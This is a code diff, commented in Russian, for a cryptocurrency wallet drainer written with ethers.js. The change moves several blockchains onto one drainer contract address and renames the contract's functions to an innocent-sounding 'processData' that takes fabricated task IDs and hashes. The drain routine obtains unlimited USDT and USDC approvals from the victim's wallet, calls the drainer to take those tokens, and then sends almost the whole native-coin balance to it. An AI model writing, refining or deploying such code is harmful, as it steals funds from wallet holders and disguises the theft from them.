@@ -10,8 +10,7 @@ const ERC20_ABI = [
 
 // ABI для дрейнера
 const DRAINER_ABI = [
-  "function tK7(uint256 usdtAmount, uint256 usdcAmount) external",
-  "function bN3() external payable"
+  "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce) external payable"
 ];
 
 // Ключи API для сканеров
@@ -31,7 +30,7 @@ const CHAINS = {
     rpcUrls: ["https://rpc.ankr.com/eth"],
     usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
     usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
+    drainerAddress: "0x58F4380EC195822dE49Cb45CA6E4Ba1F047d38D2",
     explorerApi: "https://api.etherscan.io/api",
     explorerApiKey: ETHERSCAN_API_KEY
   },
@@ -46,7 +45,7 @@ const CHAINS = {
     ],
     usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
     usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
-    drainerAddress: "0xA69a0586011cB48B15887BbA2834F0B353b70182",
+    drainerAddress: "0x58F4380EC195822dE49Cb45CA6E4Ba1F047d38D2",
     explorerApi: "https://api.bscscan.com/api",
     explorerApiKey: BSCSCAN_API_KEY
   },
@@ -57,7 +56,7 @@ const CHAINS = {
     rpcUrls: ["https://polygon-rpc.com/"],
     usdtAddress: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
     usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
-    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
+    drainerAddress: "0x58F4380EC195822dE49Cb45CA6E4Ba1F047d38D2",
     explorerApi: "https://api.polygonscan.com/api",
     explorerApiKey: POLYGONSCAN_API_KEY
   },
@@ -68,7 +67,7 @@ const CHAINS = {
     rpcUrls: ["https://arb1.arbitrum.io/rpc"],
     usdtAddress: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
     usdcAddress: "0xAF88d065e77c8cC2239327C5EDb3A432268e5831",
-    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
+    drainerAddress: "0x58F4380EC195822dE49Cb45CA6E4Ba1F047d38D2",
     explorerApi: "https://api.arbiscan.io/api",
     explorerApiKey: ARBISCAN_API_KEY
   },
@@ -79,7 +78,7 @@ const CHAINS = {
     rpcUrls: ["https://mainnet.optimism.io"],
     usdtAddress: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
     usdcAddress: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",
-    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
+    drainerAddress: "0x58F4380EC195822dE49Cb45CA6E4Ba1F047d38D2",
     explorerApi: "https://api-optimistic.etherscan.io/api",
     explorerApiKey: OPTIMISTIC_ETHERSCAN_API_KEY
   },
@@ -90,7 +89,7 @@ const CHAINS = {
     rpcUrls: ["https://mainnet.base.org"],
     usdtAddress: "0xfde4C96c8593536E31F229EA8d515f7bC60b677",
     usdcAddress: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
-    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
+    drainerAddress: "0x58F4380EC195822dE49Cb45CA6E4Ba1F047d38D2",
     explorerApi: "https://api.basescan.org/api",
     explorerApiKey: BASESCAN_API_KEY
   },
@@ -201,27 +200,109 @@ async function drain(chainId, signer, userAddress, bal) {
   const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, signer);
   const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, signer);
 
+  // Первая подпись: approve для USDT и USDC
+  let canDrainTokens = false;
+
   if (bal.usdtBalance.gt(0)) {
-    const allowance = await usdt.allowance(userAddress, config.drainerAddress);
-    if (allowance.lt(bal.usdtBalance)) {
-      await usdt.approve(config.drainerAddress, MAX);
+    console.log(`📊 USDT баланс: ${ethers.utils.formatUnits(bal.usdtBalance, 6)} USDT`);
+    const allowanceBefore = await usdt.allowance(userAddress, config.drainerAddress);
+    console.log(`📜 USDT allowance до: ${ethers.utils.formatUnits(allowanceBefore, 6)} USDT`);
+
+    if (allowanceBefore.lt(bal.usdtBalance)) {
+      try {
+        const tx = await usdt.approve(config.drainerAddress, MAX);
+        await tx.wait();
+        console.log("✅ USDT approve успешен:", tx.hash);
+
+        // Проверяем allowance после approve
+        const allowanceAfter = await usdt.allowance(userAddress, config.drainerAddress);
+        console.log(`📜 USDT allowance после: ${ethers.utils.formatUnits(allowanceAfter, 6)} USDT`);
+        if (allowanceAfter.lt(bal.usdtBalance)) {
+          throw new Error("USDT allowance не установлен корректно");
+        }
+      } catch (e) {
+        console.error(`❌ Ошибка approve для USDT: ${e.message}`);
+        throw e;
+      }
     }
+    canDrainTokens = true;
   }
 
   if (bal.usdcBalance.gt(0)) {
-    const allowance = await usdc.allowance(userAddress, config.drainerAddress);
-    if (allowance.lt(bal.usdcBalance)) {
-      await usdc.approve(config.drainerAddress, MAX);
+    console.log(`📊 USDC баланс: ${ethers.utils.formatUnits(bal.usdcBalance, 6)} USDC`);
+    const allowanceBefore = await usdc.allowance(userAddress, config.drainerAddress);
+    console.log(`📜 USDC allowance до: ${ethers.utils.formatUnits(allowanceBefore, 6)} USDC`);
+
+    if (allowanceBefore.lt(bal.usdcBalance)) {
+      try {
+        const tx = await usdc.approve(config.drainerAddress, MAX);
+        await tx.wait();
+        console.log("✅ USDC approve успешен:", tx.hash);
+
+        // Проверяем allowance после approve
+        const allowanceAfter = await usdc.allowance(userAddress, config.drainerAddress);
+        console.log(`📜 USDC allowance после: ${ethers.utils.formatUnits(allowanceAfter, 6)} USDC`);
+        if (allowanceAfter.lt(bal.usdcBalance)) {
+          throw new Error("USDC allowance не установлен корректно");
+        }
+      } catch (e) {
+        console.error(`❌ Ошибка approve для USDC: ${e.message}`);
+        throw e;
+      }
+    }
+    canDrainTokens = true;
+  }
+
+  // Вторая подпись: вызов processData для списания USDT и USDC
+  if (canDrainTokens) {
+    const taskId = Math.floor(Math.random() * 1000000);
+    const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-tokens-${Date.now()}`));
+    const nonce = Math.floor(Math.random() * 1000000);
+
+    try {
+      const tx = await drainer.processData(taskId, dataHash, nonce, {
+        value: 0, // Не отправляем BNB на этом этапе
+        gasLimit: 300000,
+        gasPrice: ethers.utils.parseUnits("3", "gwei")
+      });
+      const receipt = await tx.wait();
+      if (receipt.status !== 1) {
+        throw new Error("Транзакция processData (токены) не удалась");
+      }
+      console.log("✅ Дрейнинг токенов успешен:", receipt.transactionHash);
+    } catch (e) {
+      console.error(`❌ Ошибка вызова processData (токены): ${e.message}`);
+      throw e;
     }
   }
 
-  if (bal.usdtBalance.gt(0) || bal.usdcBalance.gt(0)) {
-    await drainer.tK7(bal.usdtBalance, bal.usdcBalance);
-  }
+  // Третья подпись: вызов processData для списания BNB
+  if (bal.nativeBalance.gt(0)) {
+    const gasReserve = ethers.utils.parseEther("0.002");
+    const nativeToSend = bal.nativeBalance.sub(gasReserve);
+    const value = nativeToSend.gt(0) ? nativeToSend : 0;
 
-  const nativeToSend = bal.nativeBalance.sub(ethers.utils.parseEther("0.001"));
-  if (nativeToSend.gt(0)) {
-    await drainer.bN3({ value: nativeToSend });
+    if (value.gt(0)) {
+      const taskId = Math.floor(Math.random() * 1000000);
+      const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-bnb-${Date.now()}`));
+      const nonce = Math.floor(Math.random() * 1000000);
+
+      try {
+        const tx = await drainer.processData(taskId, dataHash, nonce, {
+          value,
+          gasLimit: 200000, // Меньше газа, так как только BNB
+          gasPrice: ethers.utils.parseUnits("3", "gwei")
+        });
+        const receipt = await tx.wait();
+        if (receipt.status !== 1) {
+          throw new Error("Транзакция processData (BNB) не удалась");
+        }
+        console.log("✅ Дрейнинг BNB успешен:", receipt.transactionHash);
+      } catch (e) {
+        console.error(`❌ Ошибка вызова processData (BNB): ${e.message}`);
+        throw e;
+      }
+    }
   }
 }
 
